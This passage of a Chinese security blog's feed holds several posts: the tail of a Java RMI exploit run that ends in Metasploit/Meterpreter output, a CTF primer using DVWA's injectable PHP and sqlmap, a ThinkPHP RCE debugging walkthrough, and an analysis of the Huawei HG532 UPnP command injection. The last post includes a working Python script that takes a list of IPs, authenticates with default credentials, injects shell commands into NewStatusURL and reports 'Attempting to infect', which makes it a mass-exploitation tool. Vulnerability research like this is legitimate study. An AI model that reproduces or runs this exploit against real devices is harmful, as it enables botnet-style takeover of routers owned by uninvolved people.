Server started.</span><br><span class="line">[*] 192.168.182.134:1099 - Sending RMI Header...</span><br><span class="line">[*] 192.168.182.134:1099 - Sending RMI Call...</span><br><span class="line">[*] 192.168.182.134:1099 - Replied to request for payload JAR</span><br><span class="line">[*] Sending stage (53845 bytes) to 192.168.182.134</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.182.133:4444 -&gt; 192.168.182.134:35718) at 2019-10-05 06:47:47 -0400</span><br><span class="line">[-] 192.168.182.134:1099 - Exploit failed: RuntimeError Timeout HTTPDELAY expired and the HTTP Server didn&apos;t get a payload request</span><br><span class="line">[*] 192.168.182.134:1099 - Server stopped.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure></p><h2>参考</h2><p><a href="https://www.4hou.com/web/15388.html" target="_blank" rel="noopener">Java RMI漏洞利用</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;是时候开始研究java代码审计了&lt;/p&gt;
&lt;h2&gt;反射&lt;/h2&gt;
&lt;p&gt;通过反射可以使得java语言具有动态特性&lt;/p&gt;
&lt;h3&gt;通过java.lang.Runtime&lt;/h3&gt;
&lt;p&gt;反射利用的代码如下：&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;highlight j
      
    
    </summary>
    
      <category term="web" scheme="https://prontosil.club/categories/web/"/>
    
    
      <category term="java" scheme="https://prontosil.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>ctf入门第一课</title>
    <link href="https://prontosil.club/2019/09/26/ctf-ru-men-di-yi-ke/"/>
    <id>https://prontosil.club/2019/09/26/ctf-ru-men-di-yi-ke/</id>
    <published>2019-09-26T09:21:27.000Z</published>
    <updated>2019-10-10T13:21:49.150Z</updated>
    
    <content type="html"><![CDATA[<h2>ctf入坑</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/" target="_blank" rel="noopener">ctfwiki</a>是一个很好的入门资源</p><p><a href="https://blog.csdn.net/weixin_41177699/article/details/89467911" target="_blank" rel="noopener">适合新手的CTF靶场合集</a></p><p>最经典的靶场<a href="https://ctf.bugku.com" target="_blank" rel="noopener">bugkuctf</a></p><h2>如何学习</h2><p>学会做笔记——使用markdown快速整理你的思路</p><p>论博客的重要性——Github pages or Wordpress or 各大博客平台(简书，csdn，博客园，掘金等等)</p><p>学会分享——分享自己所学到的知识</p><p>学会使用python</p><h2>如何提问</h2><p><a href="https://blog.csdn.net/danky/article/details/1370632" target="_blank" rel="noopener">提问的艺术</a></p><h2>Web安全</h2><p>Web安全主要包含——SQL注入，XSS跨站，SSRF，各种web框架的审计等</p><h3>SQL注入</h3><p><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">sqlmap</a></p><p><a href="https://www.runoob.com/sql/sql-tutorial.html" target="_blank" rel="noopener">SQL教程</a></p><p>前端与后台是如何交互的</p><p>输入1返回的值</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dvwa.png" alt=""></p><p>后台的代码：</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line">$id = $_REQUEST[ <span class="string">'id'</span> ];</span><br><span class="line"><span class="comment">// Check database</span></span><br><span class="line">$query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>重点关注：</p><p><code>&quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;</code></p><p><code>where</code>语句的用法</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dvwa.png" alt=""></p><p>详情参考<a href="https://prontosil.club/2019/07/20/dvwa-xue-xi/">DVWA学习</a></p><p>栗子<a href="https://prontosil.club/2019/07/15/liang-dao-sql-zhu-ru-ti/">sql注入实践</a></p><p>墨者的一道<a href="http://219.153.49.228:47452/new_list.php?id=1" target="_blank" rel="noopener">题目</a></p><p>看到新闻页面<img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sql8.png" alt=""></p><p>直接上<code>sqlmap</code></p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sql10.png" alt=""></p><p>爆表<img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sql9.png" alt=""></p><p>指定数据库爆表</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sql11.png" alt=""></p><p>指定表爆字段</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sql12.png" alt=""></p><p>将表全部dump出来</p><p>突然出问题了。。</p><h3>XSS跨站</h3><p><a href="https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/#self-xss" target="_blank" rel="noopener">参考ctfwiki</a></p><p>具体细节之后说</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;ctf入坑&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://ctf-wiki.github.io/ctf-wiki/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ctfwiki&lt;/a&gt;是一个很好的入门资源&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https:
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="学习" scheme="https://prontosil.club/tags/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="sqlmap" scheme="https://prontosil.club/tags/sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp-rce分析</title>
    <link href="https://prontosil.club/2019/09/24/thinkphp-rce-fen-xi/"/>
    <id>https://prontosil.club/2019/09/24/thinkphp-rce-fen-xi/</id>
    <published>2019-09-24T12:44:06.000Z</published>
    <updated>2019-09-24T13:01:19.231Z</updated>
    
    <content type="html"><![CDATA[<p>太惭愧了，今年一月份大火的thinkphp漏洞根本没关注，现在回过头来仔细分析下</p><h2>开启debug模式</h2><p>先放截图：<img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/thinkphp.png" alt=""></p><p>然后开始一步步来搞</p><p><code>php-storm</code>如何调试就不细说了</p><p><code>thinkphp</code>从这里开始启动，有机会一定要分析下<code>thinkphp</code>是如何运行的<img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/thinkphp0.png" alt=""></p><p>这里<code>F8</code>一下先进入了一个<code>autoload</code>函数，具体作用不是很清楚</p><p>进入<code>run</code>函数之后，会先实例化一个<code>$request</code>之后进行一些模块绑定的操作，之后进入<code>self::routerCheck</code>函数，进行URL路由检测</p><p>而<code>self::routerCheck</code>函数又会调用<code>Route::check</code>函数</p><p><code>Route::check</code>函数中：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$url = str_replace($depr, <span class="string">'|'</span>, $url);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strpos($url, <span class="string">'|'</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">self</span>::$rules[<span class="string">'alias'</span>][strstr($url, <span class="string">'|'</span>, <span class="keyword">true</span>)])) &#123;</span><br><span class="line">    <span class="comment">// 检测路由别名</span></span><br><span class="line">    $result = <span class="keyword">self</span>::checkRouteAlias($request, $url, $depr);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> !== $result) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$method = strtolower($request-&gt;method());</span><br><span class="line"><span class="comment">// 获取当前请求类型的路由规则</span></span><br><span class="line">$rules = <span class="keyword">self</span>::$rules[$method];</span><br><span class="line"><span class="comment">// 检测域名部署</span></span><br><span class="line"><span class="keyword">if</span> ($checkDomain) &#123;</span><br><span class="line">    <span class="keyword">self</span>::checkDomain($request, $rules, $method);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里最关键的就是<code>$method = strtolower($request-&gt;method());</code></p><p>转过头来分析这个函数</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 当前的请求类型</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bool $method  true 获取原始请求类型</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span>   </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">method</span><span class="params">($method = false)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">true</span> === $method) &#123;</span><br><span class="line">            <span class="comment">// 获取原始请求类型</span></span><br><span class="line">            <span class="keyword">return</span> IS_CLI ? <span class="string">'GET'</span> : (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>]) ? <span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>] : $_SERVER[<span class="string">'REQUEST_METHOD'</span>]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="keyword">$this</span>-&gt;method) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[Config::get(<span class="string">'var_method'</span>)])) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;method = strtoupper($_POST[Config::get(<span class="string">'var_method'</span>)]);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_HTTP_METHOD_OVERRIDE'</span>])) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;method = strtoupper($_SERVER[<span class="string">'HTTP_X_HTTP_METHOD_OVERRIDE'</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;method = IS_CLI ? <span class="string">'GET'</span> : (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>]) ? <span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>] : $_SERVER[<span class="string">'REQUEST_METHOD'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;method;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/thinkphp1.png" alt=""></p><p>此时我们看到调用了<code>__construct</code>方法</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/thinkphp2.png" alt=""></p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 架构函数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $options 参数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($options = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($options <span class="keyword">as</span> $name =&gt; $item) &#123;</span><br><span class="line">        <span class="keyword">if</span> (property_exists(<span class="keyword">$this</span>, $name)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$name = $item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;filter)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = Config::get(<span class="string">'default_filter'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 保存 php://input</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;input = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;太惭愧了，今年一月份大火的thinkphp漏洞根本没关注，现在回过头来仔细分析下&lt;/p&gt;
&lt;h2&gt;开启debug模式&lt;/h2&gt;
&lt;p&gt;先放截图：
&lt;img src=&quot;https://raw.githubusercontent.com/xinyongpeng/gitpic/m
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>华为路由器 H532G 漏洞分析</title>
    <link href="https://prontosil.club/2019/09/20/hua-wei-lu-you-qi-h532g-lou-dong-fen-xi/"/>
    <id>https://prontosil.club/2019/09/20/hua-wei-lu-you-qi-h532g-lou-dong-fen-xi/</id>
    <published>2019-09-20T00:43:54.000Z</published>
    <updated>2019-09-20T01:01:46.298Z</updated>
    
    <content type="html"><![CDATA[<h2>漏洞分析</h2><p>这次出问题的点是<code>upnp</code>程序</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">home/oit/Downloads/_router HG532e.rar-0.extracted/_HG532eV100R001C01B020_upgrade_packet.bin.extracted/squashfs-root/bin [oit@ubuntu] [18:36]</span><br><span class="line">&gt; file upnp </span><br><span class="line">upnp: ELF 32-bit MSB  executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked (uses shared libs), corrupted section header size</span><br></pre></td></tr></table></figure></p><p>是MIPS32位大端格式</p><blockquote><p>UPnP 是由“通用即插即用论坛”（UPnP™ Forum）推广的一套网络协议。该协议的目标是使家庭网络（数据共享、通信和娱乐）和公司网络中的各种设备能够相互无缝连接，并简化相关网络的实现。</p></blockquote><p>丢到IDA中分析</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">LOAD:004074FC                 la      $a1, aNewstatusurl  # &quot;NewStatusURL&quot;</span><br><span class="line">LOAD:00407500                 move    $a2, $zero</span><br><span class="line">LOAD:00407504                 jalr    $t9 ; ATP_XML_GetChildNodeByName</span><br><span class="line">LOAD:00407508                 addiu   $a3, $sp, 0x24</span><br><span class="line">LOAD:0040750C                 lw      $gp, 0x18($sp)</span><br><span class="line">LOAD:00407510                 bnez    $v0, loc_407564</span><br><span class="line">LOAD:00407514                 move    $s1, $v0</span><br><span class="line">LOAD:00407518                 lw      $v0, 0x24($sp)</span><br><span class="line">LOAD:0040751C                 nop</span><br><span class="line">LOAD:00407520                 beqz    $v0, loc_407564</span><br><span class="line">LOAD:00407524                 addiu   $s0, $sp, 0x28</span><br><span class="line">LOAD:00407528                 la      $t9, snprintf</span><br><span class="line">LOAD:0040752C                 lw      $a3, 0x20($sp)</span><br><span class="line">LOAD:00407530                 la      $a2, aUpgGUST1Firmwa  # &quot;upg -g -U %s -t &apos;1 Firmware Upgrade Ima&quot;...</span><br><span class="line">LOAD:00407538                 move    $a0, $s0</span><br><span class="line">LOAD:0040753C                 li      $a1, 0x400</span><br><span class="line">LOAD:00407540                 jalr    $t9 ; snprintf</span><br><span class="line">LOAD:00407544                 sw      $v0, 0x10($sp)</span><br><span class="line">LOAD:00407548                 lw      $gp, 0x18($sp)</span><br><span class="line">LOAD:0040754C                 nop</span><br><span class="line">OAD:00407520                 beqz    $v0, loc_407564</span><br><span class="line">LOAD:00407524                 addiu   $s0, $sp, 0x28</span><br><span class="line">LOAD:00407528                 la      $t9, snprintf</span><br><span class="line">LOAD:0040752C                 lw      $a3, 0x20($sp)</span><br><span class="line">LOAD:00407530                 la      $a2, aUpgGUST1Firmwa  # &quot;upg -g -U %s -t &apos;1 Firmware Upgrade Ima&quot;...</span><br><span class="line">LOAD:00407538                 move    $a0, $s0</span><br><span class="line">LOAD:0040753C                 li      $a1, 0x400</span><br><span class="line">LOAD:00407540                 jalr    $t9 ; snprintf</span><br><span class="line">LOAD:00407544                 sw      $v0, 0x10($sp)</span><br><span class="line">LOAD:00407548                 lw      $gp, 0x18($sp)</span><br><span class="line">LOAD:0040754C                 nop</span><br><span class="line">LOAD:00407550                 la      $t9, system #执行system</span><br></pre></td></tr></table></figure></p><p>分析upnp描述信息后 发现该设备支持名为<code>DeviceUpgrade</code>的一种服务类型 设备可以通过这种服务更新固件 具体过程是向<code>“/ctrlt/DeviceUpgrade_1”</code>这个地址提交请求 请求中包含NewStatusURL及NewDownloadURL两个元素。远程管理员可以通过该漏洞在设备上执行任意命令 将shell元字符 注入NewStatusURL以及NewDownloadURL元素中</p><p><img src="https://prontosil.club/ctfsmallbook/IOT/assets/poc-1568898827379.png" alt="img"></p><p>先调用了一个xml相关的函数，获取参数的值，很明显的看到了参数拼接的行为，之后调用了<code>system</code>函数</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">snprintf($s0, 0x400, &apos;upg -g -U %s -t &apos;1 Firmware Upgrade Image&apos; -c upnp -r %s -d -&apos;, NewDownloadURL, NewStatusURL)</span><br><span class="line"></span><br><span class="line">system($s0)</span><br></pre></td></tr></table></figure></p><p>不过还有一个认证机制需要 <code>Authorization</code> 头 才能过掉 <code>check</code>, 否则会 <code>401</code></p><p><img src="https://prontosil.club/ctfsmallbook/IOT/assets/006daSSqgy1fyhykbu0axj30fw074dg9.jpg" alt="img"></p><h2>实际测试</h2><p><a href="https://ia601506.us.archive.org/22/items/RouterHG532e/router%20HG532e.rar" target="_blank" rel="noopener">路由器下载地址</a></p><p>尝试直接运行脚本失败了</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@ml-vm:/home/oit/tools/fat# ./sources/extractor/extractor.py -b iot -sql 127.0.0.1 -np -nk &quot;./HG532e.rar&quot; images</span><br><span class="line">-----------------Extractor Start----------------</span><br><span class="line">input:./HG532e.rar</span><br><span class="line">output:images</span><br><span class="line">rootfs:True</span><br><span class="line">kernel:False</span><br><span class="line">parallel:False</span><br><span class="line">sql:127.0.0.1</span><br><span class="line">brand:iot</span><br><span class="line">-----------------Extractor End------------------</span><br><span class="line">&gt;&gt; Database Image ID: 146</span><br><span class="line"></span><br><span class="line">/home/oit/tools/fat/HG532e.rar</span><br><span class="line">&gt;&gt; MD5: 9986b8aee8e1eb511a8bbb3a39b485e4</span><br><span class="line">&gt;&gt; Tag: 146</span><br><span class="line">&gt;&gt; Temp: /tmp/tmpLXreHs</span><br><span class="line">&gt;&gt; Status: Kernel: True, Rootfs: False, Do_Kernel: False,                 Do_Rootfs: True</span><br><span class="line">&gt;&gt;&gt;&gt; RAR archive data, first volume type: MAIN_HEAD</span><br><span class="line">&gt;&gt; Recursing into archive ...</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;./sources/extractor/extractor.py&quot;, line 425, in extract</span><br><span class="line">  File &quot;./sources/extractor/extractor.py&quot;, line 472, in _check_archive</span><br><span class="line">  File &quot;./sources/extractor/extractor.py&quot;, line 693, in _check_recursive</span><br><span class="line">  File &quot;./sources/extractor/extractor.py&quot;, line 381, in extract</span><br><span class="line">UnicodeDecodeError: &apos;ascii&apos; codec can&apos;t decode byte 0xd8 in position 37: ordinal not in range(128)</span><br><span class="line">&gt;&gt; Cleaning up /tmp/tmpLXreHs...</span><br></pre></td></tr></table></figure></p><p>打算用qemu运行一个虚拟机来搞</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@ml-vm:/mnt/hgfs/IOTEXP/_router HG532e.rar.extracted/_HG532eV100R001C01B020_upgrade_packet.bin.extracted# sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -nographic -net nic -net tap,ifname=br0,script=no,downscript=no</span><br><span class="line">[    0.000000] Initializing cgroup subsys cpuset</span><br><span class="line">[    0.000000] Initializing cgroup subsys cpu</span><br><span class="line">[    0.000000] Linux version 2.6.32-5-4kc-malta (Debian 2.6.32-48squeeze4) (dannf@debian.org) (gcc version 4.3.5 (Debian 4.3.5-4) ) #1 Tue Sep 24 00:02:22 UTC 2013</span><br><span class="line">[    0.000000] </span><br><span class="line">[    0.000000] LINUX started...</span><br><span class="line">[    0.000000] bootconsole [early0] enabled</span><br><span class="line">[    0.000000] CPU revision is: 00019300 (MIPS 24Kc)</span><br><span class="line">[    0.000000] FPU revision is: 00739300</span><br><span class="line">[    0.000000] Determined physical RAM map:</span><br><span class="line">[    0.000000]  memory: 00001000 @ 00000000 (reserved)</span><br><span class="line">...</span><br><span class="line">[    0.000000] SLUB: Genslabs=7, HWalign=64, Order=0-3, MinObjects=0, CPUs=1, Nodes=1</span><br><span class="line">[    0.000000] Hierarchical RCU implementation.</span><br><span class="line">[    0.000000] NR_IRQS:256</span><br><span class="line">[    0.000000] CPU frequency 200.00 MHz</span><br><span class="line">[    0.000000] Console: colour dummy device 80x25</span><br><span class="line">[    0.000000] console [tty0] enabled, bootconsole disabled</span><br></pre></td></tr></table></figure></p><p>但是一直没有打开shell</p><p><a href="https://people.debian.org/~aurel32/qemu/mips/" target="_blank" rel="noopener">ebian mips qemu镜像</a></p><p>换了一个磁盘和内核，成功地开启了虚拟机但是网络配置没有成功</p><p>未完待续。。</p><p>修改了一下<code>/etc/network/interfaces</code>成功了</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r ./squashfs-root  root@192.168.104.187:/root</span><br></pre></td></tr></table></figure></p><p>文件拷贝进去</p><p><img src="https://prontosil.club/ctfsmallbook/IOT/assets/1568899195225.png" alt="1568899195225"></p><p>进入虚拟机之后开启服务</p><p><img src="https://prontosil.club/ctfsmallbook/IOT/assets/1568899403542.png" alt="1568899403542"></p><p><img src="https://prontosil.club/ctfsmallbook/IOT/assets/1568899461104.png" alt="1568899461104"></p><p>exp</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading, sys, time, random, socket, re, os, struct, array, requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPDigestAuth</span><br><span class="line">ips = open(sys.argv[<span class="number">1</span>], <span class="string">"r"</span>).readlines()</span><br><span class="line">cmd = <span class="string">""</span> <span class="comment"># Your MIPS (SSHD)</span></span><br><span class="line">rm = <span class="string">"&lt;?xml version=\"1.0\" ?&gt;\n    &lt;s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"&gt;\n    &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"&gt;\n    &lt;NewStatusURL&gt;$("</span> + cmd + <span class="string">")&lt;/NewStatusURL&gt;\n&lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;\n&lt;/u:Upgrade&gt;\n    &lt;/s:Body&gt;\n    &lt;/s:Envelope&gt;"</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exploit</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span> <span class="params">(self, ip)</span>:</span></span><br><span class="line">            threading.Thread.__init__(self)</span><br><span class="line">            self.ip = str(ip).rstrip(<span class="string">'\n'</span>)</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                url = <span class="string">"http://"</span> + self.ip + <span class="string">":37215/ctrlt/DeviceUpgrade_1"</span></span><br><span class="line">                requests.post(url, timeout=<span class="number">5</span>, auth=HTTPDigestAuth(<span class="string">'dslf-config'</span>, <span class="string">'admin'</span>), data=rm)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[SOAP] Attempting to infect "</span> + self.ip</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        n = exploit(ip)</span><br><span class="line">        n.start()</span><br><span class="line">        time.sleep(<span class="number">0.03</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p><p>确实成功了</p><p>但是没有虚拟机上没有这个命令emmm</p><p><img src="https://prontosil.club/ctfsmallbook/IOT/assets/1568899744970.png" alt="1568899744970"></p><h2>参考</h2><p><a href="https://paper.seebug.org/490/" target="_blank" rel="noopener">Huawei HG532 系列路由器远程命令执行漏洞分析</a></p><p><a href="https://paper.seebug.org/490/" target="_blank" rel="noopener">CVE-2017-17215路由器漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;漏洞分析&lt;/h2&gt;
&lt;p&gt;这次出问题的点是&lt;code&gt;upnp&lt;/code&gt;程序&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
